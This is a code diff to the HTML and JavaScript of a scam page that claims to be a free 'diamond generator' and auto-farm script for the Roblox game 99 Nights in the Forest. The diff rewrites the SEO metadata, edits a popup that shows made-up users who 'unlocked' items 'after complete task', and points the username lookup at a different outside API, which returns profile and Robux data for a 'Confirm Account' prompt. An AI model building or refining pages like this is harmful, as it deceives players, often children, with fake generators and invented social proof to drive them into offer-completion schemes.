@@ -1,19 +1,20 @@
 <!DOCTYPE html><html lang="en" dir="ltr"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>99 Nights in the Forest Class Unlocker - Free Classes Script | Auto Farm</title>
-    <meta name="description" content="Unlock any class in 99 Nights in the Forest! Free class unlocker, auto farm script, and class guide. Learn how to get your favorite classes fast with our working script.">
-    <meta name="keywords" content="99 nights in the forest class, 99 nights in the forest classes, roblox 99 nights in the forest class, 99 nights in the forest class script, 99 nights in the forest class farm, survive 99 nights in the forest class, 99 nights in the forest class farm script, 99 nights in the forest classes guide, 99 nights in the forest class wiki, how to get classes in 99 nights in the forest, 99 nights in the forest class unlock, how to unlock class in 99 nights in the forest, 99 nights in the forest script auto class pastebin, 99 nights in the forest auto class script, 99 nights in the forest auto class, 99 nights in the forest script auto class download, 99 nights in the forest auto farm class script, 99 nights in the forest auto farm class, 99 nights in the forest script auto collect class">
+    <title>99 Nights in the Forest Diamond Generator - Free Diamonds Script | Auto Farm</title>
+    <meta name="description" content="Get unlimited diamonds in 99 Nights in the Forest! Free diamond generator, auto farm script, and diamond chest guide. Learn how to get diamonds fast with our working script.">
+    <meta name="keywords" content="99 nights in the forest diamond, 99 nights in the forest diamonds, roblox 99 nights in the forest diamond, 99 nights in the forest diamond script, 99 nights in the forest diamond farm, survive 99 nights in the forest diamond, 99 nights in the forest diamond farm script, 99 nights in the forest diamonds price, 99 nights in the forest diamond chest, 99 nights in the forest diamonds wiki, how to get diamonds in 99 nights in the forest, 99 nights in the forest diamond prices, how to get diamond in 99 nights in the forest, 99 nights in the forest script auto diamond pastebin, 99 nights in the forest auto diamond script, 99 nights in the forest auto diamond, 99 nights in the forest script auto diamond download, 99 nights in the forest auto farm diamond script, 99 nights in the forest auto farm diamond, 99 nights in the forest script auto collect diamond">
     <meta name="robots" content="index, follow">
-    <meta name="author" content="99 Nights Class Unlocker">
-    <meta property="og:title" content="99 Nights in the Forest Class Unlocker - Free Classes Script">
-    <meta property="og:description" content="Unlock any class in 99 Nights in the Forest! Free class unlocker, auto farm script, and class guide.">
+    <meta name="author" content="99 Nights Diamond Generator">
+    <meta property="og:title" content="99 Nights in the Forest Diamond Generator - Free Diamonds Script">
+    <meta property="og:description" content="Get unlimited diamonds in 99 Nights in the Forest! Free diamond generator, auto farm script, and diamond chest guide.">
     <meta property="og:type" content="website">
     <meta property="og:url" content="">
     <meta property="og:image" content="images/unnamed.webp">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="99 Nights in the Forest Class Unlocker - Free Classes Script">
-    <meta name="twitter:description" content="Unlock any class in 99 Nights in the Forest! Free class unlocker, auto farm script, and class guide.">
+    <meta name="twitter:title" content="99 Nights in the Forest Diamond Generator - Free Diamonds Script">
+    <meta name="twitter:description" content="Get unlimited diamonds in 99 Nights in the Forest! Free diamond generator, auto farm script, and diamond chest guide.">
+    <meta name="twitter:image" content="images/unnamed.webp">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Russo+One&display=swap" rel="stylesheet">
     <script src="js/jquery-3.6.0.min.js"></script>
     <style>
@@ -765,7 +766,7 @@
                     { name: 'Alien', img: 'images/Alienclass.png' }
                 ];
                 const chosen = classes[Math.floor(Math.random() * classes.length)];
-                const html = `<div class="message"><div class="img"><img src="${profile.avatarUrl}" alt="${profile.username}'s avatar"></div><div class="more"><div>${profile.username} <img src="${profile.flagUrl}" style="width: 16px; height: 12px; margin-left: 5px; border-radius: 2px;" alt="${profile.country} flag"></div><div>Unlocked <strong>${chosen.name}</strong> <img src="${chosen.img}" style="width: 16px; height: 16px; margin: 0 3px; border-radius: 3px;" alt="${chosen.name}"> after complete 1 offer</div></div></div>`;
+                const html = `<div class="message"><div class="img"><img src="${profile.avatarUrl}" alt="${profile.username}'s avatar"></div><div class="more"><div>${profile.username} <img src="${profile.flagUrl}" style="width: 16px; height: 12px; margin-left: 5px; border-radius: 2px;" alt="${profile.country} flag"></div><div>Unlocked <strong>${chosen.name}</strong> <img src="${chosen.img}" style="width: 16px; height: 16px; margin: 0 3px; border-radius: 3px;" alt="${chosen.name}"> after complete task</div></div></div>`;
                 $(".cliameds").html(html).fadeIn();
                 setTimeout(() => $(".cliameds").fadeOut(), 4000);
             }, 6000);
@@ -845,7 +846,6 @@
         // --- Function to lookup avatar/profile by username and ask for confirmation (JSON API) ---
         const showUsernameConfirmation = (username, itemName, itemImage, onRetry) => {
             const popupContent = document.querySelector('.popup-content');
-            const endpoint = `https://theclassicswing.com/api/picture.php?username=${encodeURIComponent(username)}`;
 
             // Loading state while fetching profile
             popupContent.innerHTML = `
@@ -864,49 +864,61 @@
                 </div>
             `;
 
-            fetchUserProfile(endpoint)
-                .then(function(userData) {
-                    if (userData && (userData.Found === 'OK' || userData.Found === true)) {
-                        // Save to globalData when available
-                        try {
-                            globalData.full_name = userData.full_name || null;
-                            globalData.user_name = userData.user_name || username;
-                            globalData.friends_count = userData.friends_count || null;
-                            globalData.followers_count = userData.followers_count || null;
-                            globalData.followings_count = userData.followings_count || null;
-                            globalData.user_id = userData.user_id || null;
-                            globalData.user_avatar = userData.user_avatar || null;
-                            globalData.robux = userData.robux || null;
-                        } catch (e) {}
+            // Use suggested API (single call)
+            const endpoint = `https://abadaoucht.com/tiktok/api/roblox/userinfo/${encodeURIComponent(username)}`;
 
-                        popupContent.innerHTML = `
-                            <div class="profile-title">Confirm Account</div>
-                            <div class="profile-title-line"></div>
-                            <img src="${userData.user_avatar}" class="profile-avatar" alt="Avatar of ${userData.user_name || username}">
-                            <div class="profile-username">${userData.full_name ? userData.full_name + ' ' : ''}(@${userData.user_name || username})</div>
-                            <div class="profile-stats">
-                                <div class="stat-box">
-                                    <div class="stat-label">Friends</div>
-                                    <div class="stat-value">${userData.friends_count ?? '-'}</div>
-                                </div>
-                                <div class="stat-box">
-                                    <div class="stat-label">Followers</div>
-                                    <div class="stat-value">${userData.followers_count ?? '-'}</div>
-                                </div>
-                                <div class="stat-box">
-                                    <div class="stat-label">Following</div>
-                                    <div class="stat-value">${userData.followings_count ?? '-'}</div>
-                                </div>
+            fetchUserProfile(endpoint)
+                .then(function(apiData) {
+                    if (!apiData) { throw new Error('Empty response'); }
+
+                    // Attempt to normalize fields from the custom API
+                    const fullName = apiData.full_name || apiData.displayName || apiData.display_name || null;
+                    const userName = apiData.user_name || apiData.username || apiData.name || username;
+                    const userId = apiData.user_id || apiData.id || apiData.userId || null;
+                    const avatarUrl = apiData.user_avatar || apiData.avatarUrl || apiData.avatar || null;
+                    const friendsCount = apiData.friends_count ?? apiData.friendsCount ?? null;
+                    const followersCount = apiData.followers_count ?? apiData.followersCount ?? null;
+                    const followingsCount = apiData.followings_count ?? apiData.following_count ?? apiData.followingsCount ?? null;
+
+                    // Basic validation: need at least username or id
+                    if (!userName && !userId) { throw new Error('User not found'); }
+
+                    try {
+                        globalData.full_name = fullName;
+                        globalData.user_name = userName || username;
+                        globalData.friends_count = friendsCount;
+                        globalData.followers_count = followersCount;
+                        globalData.followings_count = followingsCount;
+                        globalData.user_id = userId;
+                        globalData.user_avatar = avatarUrl;
+                        globalData.robux = apiData.robux ?? null;
+                    } catch(e) {}
+
+                    popupContent.innerHTML = `
+                        <div class="profile-title">Confirm Account</div>
+                        <div class="profile-title-line"></div>
+                        <img src="${avatarUrl || ''}" class="profile-avatar" alt="Avatar of ${userName || username}">
+                        <div class="profile-username">${fullName ? fullName + ' ' : ''}(@${userName || username})</div>
+                        <div class="profile-stats">
+                            <div class="stat-box">
+                                <div class="stat-label">Friends</div>
+                                <div class="stat-value">${friendsCount ?? '-'}</div>
                             </div>
-                            <div class="confirmation-question">Is that you ?</div>
-                            <div class="confirmation-buttons">
-                                <button class="confirm-btn no" id="confirm-no">No</button>
-                                <button class="confirm-btn yes" id="confirm-yes">Yes</button>
+                            <div class="stat-box">
+                                <div class="stat-label">Followers</div>
+                                <div class="stat-value">${followersCount ?? '-'}</div>
                             </div>
-                        `;
-                    } else {
-                        throw new Error('User not found');
-                    }
+                            <div class="stat-box">
+                                <div class="stat-label">Following</div>
+                                <div class="stat-value">${followingsCount ?? '-'}</div>
+                            </div>
+                        </div>
+                        <div class="confirmation-question">Is that you ?</div>
+                        <div class="confirmation-buttons">
+                            <button class="confirm-btn no" id="confirm-no">No</button>
+                            <button class="confirm-btn yes" id="confirm-yes">Yes</button>
+                        </div>
+                    `;
                 })
                 .catch(function(error) {
                     console.error('Profile fetch error:', error);
